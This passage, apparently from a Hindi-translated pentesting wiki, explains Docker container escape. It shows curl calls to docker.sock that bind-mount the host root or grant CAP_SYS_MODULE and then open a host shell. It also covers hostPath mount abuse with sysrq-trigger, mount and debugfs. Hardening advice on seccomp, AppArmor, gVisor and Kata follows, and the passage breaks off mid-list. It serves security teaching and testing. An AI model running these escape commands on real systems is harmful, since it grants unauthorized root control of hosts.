ध्यान दें कि यदि आप **`/etc` या किसी अन्य फ़ोल्डर को माउंट** कर सकते हैं जिसमें **कॉन्फ़िगरेशन फ़ाइलें होती हैं**, तो आप उन्हें डॉकर कंटेनर में रूट के रूप में बदलकर उन्हें उच्चारित कर सकते हैं और विशेषाधिकारों को बढ़ा सकते हैं (शायद `/etc/shadow` को संशोधित करके)
{% endhint %}

## जांच नहीं की गई JSON संरचना

संभव है कि जब सिसएडमिन ने डॉकर फ़ायरवॉल को कॉन्फ़िगर किया था, तो उन्होंने API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) के कुछ महत्वपूर्ण पैरामीटर जैसे "**Binds**" के बारे में **भूल गए** हो सकता है।\
निम्नलिखित उदाहरण में, इस गलत कॉन्फ़िगरेशन का दुरुपयोग करके एक कंटेनर बनाना और चलाना संभव है जो होस्ट का रूट (/) फ़ोल्डर माउंट करता है:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
## जांच नहीं की गई JSON विशेषता

संभव है कि जब सिस्टम व्यवस्थापक ने डॉकर फ़ायरवॉल कॉन्फ़िगर किया था, तो उन्होंने API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) के "**HostConfig**" के अंदर "**Capabilities**" जैसी कुछ महत्वपूर्ण विशेषताओं के बारे में भूल गए हों। निम्नलिखित उदाहरण में इस गलत कॉन्फ़िगरेशन का दुरुपयोग करके हम SYS_MODULE क्षमता के साथ एक कंटेनर बना सकते हैं और चला सकते हैं:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
# लिखने योग्य hostPath माउंट

(यहां से जानकारी मिली है [**यहां**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)) कंटेनर के भीतर, एक हमलावर अपने पहुंच को बढ़ाने का प्रयास कर सकता है जो क्लस्टर द्वारा बनाए गए एक लिखने योग्य hostPath वॉल्यूम के माध्यम से मेजबान ऑपरेटिंग सिस्टम के नीचे और पहुंच प्राप्त करने की कोशिश कर सकता है। नीचे कुछ आम चीजें हैं जिन्हें आप कंटेनर के भीतर जांच सकते हैं ताकि आप इस हमलावर वेक्टर का लाभ उठा सकें:
```bash
### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```
# कंटेनर सुरक्षा में सुधार

## Docker में Seccomp

यह Docker कंटेनर से बाहर निकलने का एक तकनीक नहीं है, बल्कि यह एक सुरक्षा सुविधा है जिसका Docker उपयोग करता है और आपको इसके बारे में जानना चाहिए क्योंकि यह आपको Docker से बाहर निकलने से रोक सकता है:

{% content-ref url="seccomp.md" %}
[seccomp.md](seccomp.md)
{% endcontent-ref %}

## Docker में AppArmor

यह Docker कंटेनर से बाहर निकलने का एक तकनीक नहीं है, बल्कि यह एक सुरक्षा सुविधा है जिसका Docker उपयोग करता है और आपको इसके बारे में जानना चाहिए क्योंकि यह आपको Docker से बाहर निकलने से रोक सकता है:

{% content-ref url="apparmor.md" %}
[apparmor.md](apparmor.md)
{% endcontent-ref %}

## प्रमाणीकरण और प्रमाणीकरण

एक प्रमाणीकरण प्लगइन वर्तमान प्रमाणीकरण संदर्भ और कमांड संदर्भ दोनों के आधार पर Docker डेमन को अनुमति देता है या इनकार करता है। वर्तमान प्रमाणीकरण संदर्भ में सभी उपयोगकर्ता विवरण और प्रमाणीकरण विधि शामिल होती है। कमांड संदर्भ में सभी प्रासंगिक अनुरोध डेटा शामिल होता है।

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

## gVisor

**gVisor** एक एप्लिकेशन कर्नल है, जो Go में लिखा गया है, जो लिनक्स सिस्टम सतह का एक बड़ा हिस्सा लागू करता है। इसमें एक [ओपन कंटेनर इनिशिएटिव (OCI)](https://www.opencontainers.org) रनटाइम है जिसे `runsc` कहा जाता है और यह एक **अनुपात सीमा** प्रदान करता है एप्लिकेशन और होस्ट कर्नल के बीच। `runsc` रनटाइम Docker और Kubernetes के साथ एकीकृत होता है, जिससे सैंडबॉक्स कंटेनर चलाना आसान हो जाता है।

{% embed url="https://github.com/google/gvisor" %}

# Kata Containers

**Kata Containers** एक ओपन सोर्स समुदाय है जो सुरक्षित कंटेनर रनटाइम बनाने के लिए काम कर रहा है, जिसमें हल्के वर्चुअल मशीन का उपयोग करके कंटेनर की तरह लगती है और कंटेनर की तुलना में **हार्डवेयर वर्चुअलाइज़ेशन** तकनीक का उपयोग करके मजबूत वर्कलोड आइसोलेशन प्रदान करती है।

{% embed url="https://katacontainers.io/" %}

## सुरक्षित ढंग से कंटेनर का उपयोग करें

डॉकर डिफ़ॉल्ट रूप से कंटेनरों को प्रतिबंधित और सीमित करता है। इन प्रतिबंधनों को ढील करना सुरक्षा समस्याओं को उत्पन्न कर सकता है, यहां तक कि `--privileged` फ़्लैग की पूरी शक्ति के बिना। प्रत्येक अतिरिक्त अनुमति के प्रभाव को स्वीकार करना महत्वपूर्ण है, और संपूर्ण अनुमतियों को संक्षेप में सीमित करें।

कंटेनर को सुरक्षित रखने में मदद करने के लिए:

* `--privileged` फ़्लैग का उपयोग न करें और कंटेनर के अंदर [Docker सॉकेट माउंट](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/) न करें। डॉकर सॉकेट कंटेनर को उत्पन्न करने की अनुमति देता है, इसलिए यह एक आसान तरीका है होस्ट पर पूर्ण नियंत्रण प्राप्त करने का, उदाहरण के लिए, `--privileged` फ़्लैग के साथ एक और कंटेनर चलाकर।
* कंटेनर के अंदर रूट के रूप में न चलाएं। [अलग उपयोगकर्ता](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) या [उपयोगकर्ता नेमस्पेस](https://docs.docker.com/engine/security/userns-remap/) का उपयोग करें। कंटेनर में रूट होस्ट के समान होता है जब तक उपयोगकर्ता नेमस्पेस के साथ पुनर्मापित नहीं किया जाता है। यह केवल लाइटली प्रतिबंधित होता है, मुख्य रूप से, लिनक्स नेमस्पेस, क्षमताएँ और सीग्रुप्स द्वारा।
* [सभी क्षमताएँ छोड़ दें](https
